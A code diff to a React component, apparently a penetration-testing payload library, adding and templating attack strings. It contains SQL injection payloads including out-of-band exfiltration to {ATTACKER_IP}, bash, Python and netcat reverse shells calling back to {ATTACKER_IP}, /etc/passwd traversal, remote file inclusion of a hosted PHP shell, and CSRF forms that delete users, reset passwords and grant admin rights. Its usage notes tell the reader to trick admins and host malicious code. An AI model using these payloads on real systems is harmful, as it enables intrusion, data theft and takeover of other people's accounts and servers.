@@ -95,6 +95,13 @@ const WebTools: React.FC = () => {
       usage: "Use in URL parameters or form fields to detect column count"
     },
     {
+      name: "Union Select with URL",
+      category: "Union-based",
+      payload: "{URL}?id=1' UNION SELECT 1,2,3,4,5--",
+      description: "Complete URL with union injection payload",
+      usage: "Ready-to-use URL for testing union-based SQLi"
+    },
+    {
       name: "Database Information",
       category: "Information Gathering",
       payload: "' UNION SELECT 1,@@version,@@datadir,user(),database(),6--",
@@ -135,6 +142,20 @@ const WebTools: React.FC = () => {
       payload: "'; SELECT IF(1=1,SLEEP(5),0)--",
       description: "Time-based blind SQL injection with 5 second delay",
       usage: "MySQL time-based payload for blind injection"
+    },
+    {
+      name: "Time-based with URL",
+      category: "Blind SQLi",
+      payload: "{URL}?id=1'; SELECT IF(1=1,SLEEP(5),0)--",
+      description: "Complete URL with time-based blind SQLi",
+      usage: "Test if page delays 5 seconds when vulnerable"
+    },
+    {
+      name: "OOB Data Exfiltration",
+      category: "Out-of-Band",
+      payload: "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.{ATTACKER_IP}\\\\file'))--",
+      description: "Exfiltrate data via DNS/SMB to your server",
+      usage: "MySQL out-of-band data exfiltration to callback IP"
     },
     {
       name: "PostgreSQL Information",
@@ -448,16 +469,23 @@ const WebTools: React.FC = () => {
     {
       name: "Reverse Shell - Bash",
       category: "Reverse Shell",
-      payload: "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+      payload: "bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1",
       description: "Bash reverse shell connection",
       usage: "Replace attacker.com and port with your listener"
     },
     {
       name: "Reverse Shell - Python",
       category: "Reverse Shell",
-      payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
       description: "Python reverse shell one-liner",
-      usage: "Works when Python is available on target"
+      usage: "Uses your callback IP for reverse shell connection"
+    },
+    {
+      name: "Reverse Shell - Netcat",
+      category: "Reverse Shell",
+      payload: "nc {ATTACKER_IP} 4444 -e /bin/bash",
+      description: "Netcat reverse shell",
+      usage: "Simple reverse shell using netcat to your callback IP"
     },
     {
       name: "Web Shell Upload",
@@ -553,6 +581,20 @@ const WebTools: React.FC = () => {
       payload: "../../../etc/passwd",
       description: "Basic directory traversal to read passwd file",
       usage: "Use in file parameter of web applications"
+    },
+    {
+      name: "LFI with URL",
+      category: "Basic LFI",
+      payload: "{URL}?file=../../../etc/passwd",
+      description: "Complete URL with LFI payload",
+      usage: "Ready-to-test LFI URL"
+    },
+    {
+      name: "Remote File Inclusion",
+      category: "RFI",
+      payload: "{URL}?file={CALLBACK_URL}/shell.txt",
+      description: "Include remote file from your callback server",
+      usage: "Host malicious PHP on your server for code execution"
     },
     {
       name: "Windows LFI",
@@ -905,28 +947,28 @@ const WebTools: React.FC = () => {
     {
       name: "Basic CSRF HTML",
       category: "HTML Form",
-      payload: "<form action=\"http://vulnerable-site.com/admin/delete-user\" method=\"POST\"><input type=\"hidden\" name=\"user_id\" value=\"123\"><input type=\"submit\" value=\"Click me!\"></form>",
+      payload: "<form action=\"{URL}/admin/delete-user\" method=\"POST\"><input type=\"hidden\" name=\"user_id\" value=\"123\"><input type=\"submit\" value=\"Click me!\"></form>",
       description: "Basic CSRF attack using HTML form",
-      usage: "Host on attacker site and trick admin into clicking"
+      usage: "Host on your server and trick admin into clicking"
     },
     {
       name: "Auto-submit CSRF",
       category: "Auto-submit",
-      payload: "<form id=\"csrf\" action=\"http://vulnerable-site.com/admin/change-password\" method=\"POST\"><input type=\"hidden\" name=\"new_password\" value=\"hacked123\"></form><script>document.getElementById('csrf').submit();</script>",
+      payload: "<form id=\"csrf\" action=\"{URL}/admin/change-password\" method=\"POST\"><input type=\"hidden\" name=\"new_password\" value=\"hacked123\"></form><script>document.getElementById('csrf').submit();</script>",
       description: "Auto-submitting CSRF form",
       usage: "Executes automatically when page loads"
     },
     {
       name: "CSRF via Image",
       category: "Image-based",
-      payload: "<img src=\"http://vulnerable-site.com/admin/delete-user?user_id=123\" style=\"display:none\">",
+      payload: "<img src=\"{URL}/admin/delete-user?user_id=123\" style=\"display:none\">",
       description: "CSRF attack using image tag for GET requests",
       usage: "Works for GET-based state-changing operations"
     },
     {
       name: "AJAX CSRF",
       category: "AJAX",
-      payload: "<script>fetch('http://vulnerable-site.com/api/admin/promote-user', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({user_id: 123, role: 'admin'})});</script>",
+      payload: "<script>fetch('{URL}/api/admin/promote-user', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({user_id: 123, role: 'admin'})});</script>",
       description: "CSRF attack using AJAX/fetch",
       usage: "Works when CORS is misconfigured"
     },
